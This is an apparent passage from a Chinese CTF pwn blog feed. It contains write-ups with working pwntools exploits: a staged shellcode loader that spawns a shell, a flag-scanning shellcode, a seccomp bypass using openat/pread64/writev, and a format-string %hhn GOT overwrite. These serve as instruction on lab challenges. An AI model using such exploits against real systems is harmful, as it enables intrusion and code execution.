class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br>p.recvuntil(<span class="hljs-string">b&quot;compile)\n&quot;</span>)<br><br>stage1 = (<br>    <span class="hljs-string">b&quot;\x48\x8d\x35\x20\x00\x00\x00&quot;</span>  <span class="hljs-comment"># lea rsi, [rip+0x20]</span><br>    <span class="hljs-string">b&quot;\xb2\xff&quot;</span>                      <span class="hljs-comment"># mov dl, 0xff  只写2字节，极限</span><br>    <span class="hljs-string">b&quot;\x0f\x05&quot;</span>                      <span class="hljs-comment"># syscall</span><br>    <span class="hljs-string">b&quot;\xff\xe6&quot;</span>                      <span class="hljs-comment"># jmp rsi</span><br>)<br><br>p.send(stage1)<br><br>time.sleep(<span class="hljs-number">0.05</span>)  <span class="hljs-comment"># 留一点时间读取shellcode</span><br><br>stage2 = asm(shellcraft.sh())<br>p.send(stage2.ljust(<span class="hljs-number">0xff</span>, <span class="hljs-string">b&quot;\x90&quot;</span>))  <span class="hljs-comment"># nop填满buf，避免rubbish</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>拿下!</p><p>接下来看第二题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">char</span> *__s;<br>  <span class="hljs-type">size_t</span> sVar2;<br>  <span class="hljs-type">size_t</span> __n;<br>  <span class="hljs-type">long</span> lVar3;<br>  undefined8 *puVar4;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  byte bVar5;<br>  undefined8 local_218;<br>  undefined8 local_210;<br>  undefined8 local_208 [<span class="hljs-number">63</span>];<br>  undefined8 local_10;<br>  <br>  bVar5 = <span class="hljs-number">0</span>;<br>  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>); <span class="hljs-meta"># canary</span><br>  init(param_1);   #初始化函数<br>  local_218 = <span class="hljs-number">0</span>;<br>  local_210 = <span class="hljs-number">0</span>;<br>  puVar4 = local_208;<br>  <span class="hljs-keyword">for</span> (lVar3 = <span class="hljs-number">0x3e</span>; lVar3 != <span class="hljs-number">0</span>; lVar3 = lVar3 + <span class="hljs-number">-1</span>) &#123;<br>    *puVar4 = <span class="hljs-number">0</span>;<br>    puVar4 = puVar4 + (ulong)bVar5 * <span class="hljs-number">-2</span> + <span class="hljs-number">1</span>;<br>  &#125;<br>  *(undefined1 *)puVar4 = <span class="hljs-number">0</span>;<br>  __s = (<span class="hljs-type">char</span> *)read_flag(<span class="hljs-string">&quot;/flag&quot;</span>);  #关键<br>  sVar2 = <span class="hljs-built_in">strlen</span>(__s);<br>  __s[sVar2] = <span class="hljs-string">&#x27;H&#x27;</span>;<br>  __s[sVar2 + <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br>  __s[sVar2 + <span class="hljs-number">2</span>] = <span class="hljs-number">-0x40</span>;   <span class="hljs-meta">#xor rax,rax</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I forgot the flag.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Can you find it?&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &gt; &quot;</span>);<br>  __n = read(<span class="hljs-number">0</span>,&amp;local_218,<span class="hljs-number">0x200</span>);<br>  <span class="hljs-keyword">if</span> (__n == <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;read&quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">memcpy</span>(__s + sVar2 + <span class="hljs-number">3</span>,&amp;local_218,__n);<br>  iVar1 = mprotect(__s,<span class="hljs-number">0x1000</span>,<span class="hljs-number">5</span>);   #可执行<br>  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">-1</span>) &#123;<br>    perror(<span class="hljs-string">&quot;mprotect&quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  install_seccomp();<br>                    <span class="hljs-comment">/* WARNING: Could not recover jumptable at 0x0010169d. Too many branches */</span><br>                    <span class="hljs-comment">/* WARNING: Treating indirect jump as call */</span><br>  (*(code *)(__s + sVar2))(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  #执行<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>read_flag函数为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * <span class="hljs-title function_">read_flag</span><span class="hljs-params">(<span class="hljs-type">char</span> *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> __fd;<br>  <span class="hljs-type">void</span> *pvVar1;<br>  <br>  __fd = open(param_1,<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (__fd &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;Can\&#x27;t open flag file: &quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  pvVar1 = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,__fd,<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (pvVar1 == (<span class="hljs-type">void</span> *)<span class="hljs-number">0xffffffffffffffff</span>) &#123;<br>    perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  close(__fd);<br>  <span class="hljs-keyword">return</span> pvVar1;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑非常清晰，也很贴心，程序先把flag文件的内容直接读到内存里，然后在flag结尾拼接你输入的数据(我们写的shellcode)，再把这整块内存改成RX(可执行)，最后从flag末尾开始当函数执行你的shellcode，所以解法也是很简单，直接在mmap空间搜索<code>flag{}</code>字符串即可</p><p>这里涉及到如何编写汇编</p><p>我先直接放一下我写的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>io = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>shellcode = asm(<span class="hljs-string">r&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    lea rbx, [rip]  #加载地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">find_flag:</span><br><span class="hljs-string">    dec rbx          # rbx=rbx-1 循环</span><br><span class="hljs-string">    cmp dword ptr [rbx], 0x67616c66   # flag字符串</span><br><span class="hljs-string">    jne find_flag    #条件跳转,不是flag继续往前找,注意byte dword qword区别 </span><br><span class="hljs-string">    cmp byte ptr [rbx+4], 0x7b        #&#123; 二次验证</span><br><span class="hljs-string">    jne find_flag</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rsi, rbx      #到这里已经找到了，先将rsi设置为flag的起始地址</span><br><span class="hljs-string">    xor rdx, rdx      #len先设置为0，读取flag直到&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">len_scan:</span><br><span class="hljs-string">    cmp byte ptr [rsi + rdx], 0x7d   #&#125;</span><br><span class="hljs-string">    je write_flag</span><br><span class="hljs-string">    inc rdx             #rdx=rdx+1</span><br><span class="hljs-string">    jmp len_scan</span><br><span class="hljs-string"></span><br><span class="hljs-string">write_flag:</span><br><span class="hljs-string">    inc rdx          #加上&#125;</span><br><span class="hljs-string">    mov rdi, 1        #stdout</span><br><span class="hljs-string">    mov rax, 1         #write系统调用号</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 60       #exit</span><br><span class="hljs-string">    xor rdi, rdi      #rdi=0</span><br><span class="hljs-string">    syscall         #安全退出程序</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>io.send(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>直接看注释吧，应该蛮好理解的…</p><p>接下来看第三题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  code *__buf;<br>  <br>  init(param_1);<br>  __buf = (code *)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x114514</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input a orw_plus function (also also after compile)&quot;</span>);<br>  read(<span class="hljs-number">0</span>,__buf,<span class="hljs-number">0x500</span>);<br>  install_seccomp();<br>  (*__buf)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑和第一题一模一样，不同之处在于开启了seccomp，发现其禁用了execve,open,read,write,sendfile,没招了吗,不,其实还有很多的类似功能的<code>orw</code>供聪明的我们使用，这里我用的是<code>openat</code>,<code>pread64</code>和<code>writev</code></p><p>直接看exp吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rdi, -100     # openat(-100,flag,0,0)  系统调用号 257   在栈上动态构造shellcode  寄存器rdi rsi rdx r10 r8 r9 ...</span><br><span class="hljs-string">    push 0x67616c66   # flag </span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    xor r10, r10</span><br><span class="hljs-string">    push 257</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    push rax    # pread64(fd,buf,0x100,0)  系统调用号 17  将rax传给rdi作为fd</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    sub rsp, 0x100   #分配足够的栈空间来读取flag</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    push 0x100</span><br><span class="hljs-string">    pop rdx</span><br><span class="hljs-string">    xor r10, r10</span><br><span class="hljs-string">    push 17</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    push 1    # writev(1,struct iovec,1)  系统调用号 20  struct iovec len + base*</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    push 0x100</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    push 1</span><br><span class="hljs-string">    pop rdx</span><br><span class="hljs-string">    push 20</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;)&#x27;</span>)<br><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>这里解释一下iovec结构体(分散-聚集I&#x2F;O)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/uio.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> &#123;</span><br>    <span class="hljs-type">void</span>  *iov_base;  <span class="hljs-comment">// 缓冲区起始地址（用户空间内存）</span><br>    <span class="hljs-type">size_t</span> iov_len;   <span class="hljs-comment">// 缓冲区长度（字节数）</span><br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rsi, rsp<br>push 0x100<br>push rsi<br>mov rsi, rsp<br></code></pre></td></tr></table></figure><p>这里把rsp保存至rsi，先<code>push 0x100</code>(len)至栈上，再<code>push rsi</code>(flag起始地址)至栈上，这便形成了一个<code>struct iovec</code>，再把rsp(iov_base指针)传给rdi即可</p><p>同时,总结一下栈结构</p><p>高地址</p><p>argc<br>argv[]<br>envp[]<br>auxv[]<br>…<br>返回地址<br>saved rbp<br>canary   maybe<br>局部变量<br>…   rsp<br>低地址</p><p>LIFO,push压栈<code>rsp -= 8</code>,pop出栈<code>rsp += 8</code>…</p><p>感谢阅读…</p><p>后面再补充吧…</p><p>2026.2.11吐槽:</p><p>被lactf的shellcode打败了…</p><p>不过</p><p>慢慢来吧…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄存器</tag>
      
      <tag>shellcode编写</tag>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fmt_got</title>
    <link href="/2025/12/30/fmt-got/"/>
    <url>/2025/12/30/fmt-got/</url>
    
    <content type="html"><![CDATA[<p>你好，又见面了…</p><p>也有可能是第一次见面?</p><p>算了今天不废话了，直接看题目吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_118 [<span class="hljs-number">264</span>];<br>  undefined8 local_10;<br>  <br>  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  setup();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tell me what you want to say:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&gt; &quot;</span>);<br>  builtin_strncpy(local_118,<span class="hljs-string">&quot;That\&#x27;s what you want to say...    &quot;</span>,<span class="hljs-number">0x23</span>);<br>  read(<span class="hljs-number">0</span>,local_118 + <span class="hljs-number">0x22</span>,<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">printf</span>(local_118);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nthat\&#x27;s it? boring... bye&quot;</span>);<br>  FUN_00401140(<span class="hljs-number">1</span>);<br>  halt_baddata();<br>&#125;<br></code></pre></td></tr></table></figure><p>还悄悄藏了一个函数…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">read_flag</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  FILE *__stream;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_58 [<span class="hljs-number">72</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  __stream = fopen(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;flag not found! Contact admin if you see this on the remote server.&quot;</span>);<br>    FUN_00401140(<span class="hljs-number">1</span>);<br>  &#125;<br>  fgets(local_58,<span class="hljs-number">0x40</span>,__stream);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;How you do that... here is the flag:  %s\n&quot;</span>,local_58);<br>  fclose(__stream);<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;   <span class="hljs-meta">#ps:反正就是cat flag，写那么长我真没招了</span><br>&#125;<br></code></pre></td></tr></table></figure><p>保护为<code>NX</code>和<code>canary found</code>，但是不好意思，今天不打返回地址，注意到题目存在格式化字符串漏洞，同时保护为<code>partial RELRO</code>，因此<code>GOT</code>表可写，直接利用%n任意写覆盖exit的<code>GOT</code>表地址为<code>read_flag</code>即可</p><p>在此之前，你可能需要一些前置知识</p><p>1.什么是格式化字符串漏洞，本人词不达意，还请参考如下链接(直接点，放心)</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">fmt</a></p><p>(2026.2.11复盘时吐槽:你不是词不达意，你是懒得写…)</p><p>2.什么是got表，什么是plt，动态链接器(ld,哈哈哈)和共享库是什么，程序第一次调用<code>puts</code>这个函数时到底发生了什么，想必经过ret2libc的洗礼，前两个问题的答案你已知晓，但是后两个问题将回到更底层的维度，等待着你去探索(我也在探索中…)，也许我后面会写一篇关于此和ret2dlresolve的文章，等我先沉淀沉淀吧…</p><p>OK，还是回到题目本身</p><p>先观察我们格式化字符的写入点</p><p><img src="/images/6.png" alt="qwq"></p><p>可以看到，我们的<code>AAAA</code>从第十个<code>%p</code>的第低三位个字节开始写起，我们的目标是将exit的got(0x403430)覆写为read_flag(0x401236)，采用<code>%hhn</code>逐字节写的方式</p><p>先将0x403430的最低字节0x30覆写为0x36(注意小端序地址表示法)，注意<code>builtin_strncpy(local_118,&quot;That\&#39;s what you want to say...    &quot;,0x23);</code>已经给了<code>local_118</code>34字节的长度，所以再补20个字节得到0x36(54)便可达到目的</p><p>然后将0x403431，即第低二位字节0x34覆写为0x12即可，注意此时<code>local_118</code>的长度已经是54，而目标是0x12(18)，因此先补202个字节至256(你懂的)，再补18个字节回到0x12，一共220个字节，便成功覆写了exit的<code>GOT</code>为<code>read_flag</code></p><p>先大致写出payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload  = <span class="hljs-string">b&#x27;%20x%?$hhn%220x%?$hhn&#x27;</span><br></code></pre></td></tr></table></figure><p>?即写入地址0x403430和0x403431的位置，我们推理一下，首先?必定为两位数，因此payload所占字节长度为<code>23</code>，而我们输入的字符从第十个<code>%p</code>的第低三位个字节开始写起，因此发送payload后先是6个字节写完了10，而后还有17个字节分别完了11，12，并写了13的1个字节，因此再补7个字节的长度填满13，最后输入要覆写的地址0x403430，0x403431即在14，15的位置，真是一场酣畅淋漓的构造啊…</p><p>当时的我只是傻傻地对着wp猜偏移，经过很长时间的分析(真的很长时间，没人问，纯自己瞎折腾 (╥﹏╥) )才终于理解了本质，现在写下来，希望能帮到困惑的你…</p><p>最后贴一下完整exp(真的很短，但是也真的很值得深思…)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>os = <span class="hljs-string">&quot;linux&quot;</span><br><span class="hljs-comment">#p = process(&#x27;./fmt_got&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">46677</span>)<br><br>payload  = <span class="hljs-string">b&#x27;%20x%14$hhn%220x%15$hhn&#x27;</span><br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span><br>payload += p64(<span class="hljs-number">0x403430</span>) + p64(<span class="hljs-number">0x403431</span>)<br><br>p.sendafter(<span class="hljs-string">b&#x27;\n&gt; &#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>好了，又写一篇，感谢阅读，天天开心…</p><p>2026.2.12吐槽:</p><p>虽然写得挺唐</p><p>不过好在思路是正确的</p><p>不过我也没资格说你唐就是了</p><p>毕竟你就是我嘛…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2GOT</tag>
      
      <tag>fmt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2csu</title>
    <link href="/2025/12/25/ret2csu/"/>
    <url>/2025/12/25/ret2csu/</url>
    
    <content type="html"><![CDATA[<p>别急，还没写…</p><p>好了，现在写了…</p><p>额，还记得上次没有gadget的情况下我们采用了SROP，但是倘若没有syscall也没法控制rax呢，别急，还有一个办法，便是今天的<code>ret2csu</code></p><p>ps:现在看来当时好天真TT</p><p>一般的elf文件在<code>libc_start_main</code>中会存在<code>libc_csu_init</code>对libc进行初始化，而恰好<code>libc_csu_init</code>中隐含着两个我们可以利用的gadget…</p><p>一般长这样，<code>gadget1</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">00400606  mov rbx, [rsp+0x8]<br>0040060b  mov rbp, [rsp+0x10]<br>00400610  mov r12, [rsp+0x18]<br>00400615  mov r13, [rsp+0x20]<br>0040061a  mov r14, [rsp+0x28]<br>0040061f  mov r15, [rsp+0x30]<br>00400624  add rsp, 0x38<br>00400628  ret<br></code></pre></td></tr></table></figure><p>也有可能是一串<code>pop</code>，不过本质是一样的</p><p><code>gadget2</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">004005f0 mov     rdx, r15<br>004005f3 mov     rsi, r14<br>004005f6 mov     edi, r13d<br>004005f9 call    qword ptr [r12+rbx*8]<br></code></pre></td></tr></table></figure><p>乍一看，这啥呀，实则我们却能因此控制关键的<code>rdi</code>,<code>rsi</code>和<code>rdx</code>并调用函数，太神秘了…</p><p>好吧，还是来看具体的题目吧</p><p>题目依旧忘记出自哪里了，私密马赛</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  write(<span 